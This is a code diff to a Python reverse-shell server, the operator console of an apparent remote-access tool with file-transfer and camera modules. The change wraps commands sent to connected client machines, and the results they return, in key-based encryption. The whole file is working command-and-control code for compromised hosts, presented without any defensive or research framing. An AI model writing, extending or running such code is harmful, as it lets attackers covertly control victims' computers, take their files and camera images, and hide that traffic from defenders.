@@ -5,6 +5,7 @@ import threading
 import file_trans
 import cam
 import settings
+import cry
 
 #反弹shell服务端
 
@@ -38,33 +39,33 @@ def server_receive():
         with clients_lock: # 使用锁来保护对 clients 字典的访问
             clients[client_addr] = client_socket  # 添加键值对到字典clients，键是客户端地址，值是客户端套接字
         # print('当前客户端列表： ', clients.keys())
-
+        
+        # 新建一个server_receive_result线程，传 client_info 元组元组进去，每收到新连接的客户端，就新建一个线程接收消息，当客户端断开也能触发 except 从 clients 字典中删除
+        def server_receive_result(client_info):
+            client_socket, client_addr = client_info  # 解包元组为 套接字，客户端地址
+            try:
+                while True:
+                    # 接收内容
+                    result = client_socket.recv(10240).decode()  # 解码接受
+                    decrypted_result = cry.decrypt(result,settings.get_key())
+                    print(decrypted_result)
+                    if not result:
+                        print("\n客户端无返回数据")
+                        break
+            except:
+                print("\n服务器接收异常")
+                with clients_lock:  # 使用锁来保护对 clients 字典的访问
+                    if client_addr in clients:  # 如果当前地址在字典中
+                        del clients[client_addr]
+                        client_socket.close()
+                        print(f"\n客户端断开连接 {client_addr}")
+                        return
         # 新建一个server_receive_result线程，传 client_info 元组元组进去，每收到新连接的客户端，就新建一个线程接收消息，当客户端断开也能触发 except 从 clients 字典中删除
         thread_server_listen = threading.Thread(target=server_receive_result,args=(client_info,))
         thread_server_listen.start()
 
-# 新建一个server_receive_result线程，传 client_info 元组元组进去，每收到新连接的客户端，就新建一个线程接收消息，当客户端断开也能触发 except 从 clients 字典中删除
-def server_receive_result(client_info):
-    client_socket, client_addr = client_info  # 解包元组为 套接字，客户端地址
-    try:
-        while True:
-            # 接收内容
-            result = client_socket.recv(10240).decode()  # 解码接受
-            print(result)
-            if not result:
-                print("\n客户端无返回数据")
-                break
-    except:
-        print("\n服务器接收异常")
-        with clients_lock:  # 使用锁来保护对 clients 字典的访问
-            if client_addr in clients: # 如果当前地址在字典中
-                del clients[client_addr]
-                client_socket.close()
-                print(f"\n客户端断开连接 {client_addr}")
-                return
 
-def server_send():
-    pass
+
 
 
 
@@ -85,19 +86,20 @@ def start_server():
             while True:
                 try:
                     command_input = input('>>> ').strip()
-                    if command_input=="": #输入不为空
+                    if command_input=="": #输入为空
                         print("\n命令不能为空")
                     elif command_input == "exit":
                         print('\n当前客户端列表： ',clients.keys())
                         break # 如果输入了exit，跳出当前输入命令的循环，进入选择客户端的循环
                     else:
                         try:
-                            clients[client_addr].send(command_input.encode('utf-8'))  # 编码发送
-                        except:
-                            print("\n服务器发送异常")
-
+                            encrypted_command = cry.encrypt(command_input, settings.get_key())
+                            clients[client_addr].send(encrypted_command.encode('utf-8'))  # 编码发送
+                        except Exception as e:
+                            print("服务器发送异常" + str(e))
                 except Exception as e:
-                    print("\n服务器异常"+e)
+                    print("\n服务器异常"+ str(e))
+
     s.close()
 
 def wait_for_file():
@@ -122,7 +124,7 @@ if __name__ == '__main__':
     thread_start_server = threading.Thread(target=start_server)
     thread_start_server.start()
 
-    thread_server_listen = threading.Thread(target=server_receive)
+    thread_server_listen = threading.Thread(target=server_receive) #接收客户端，添加到列表
     thread_server_listen.start()
 
 
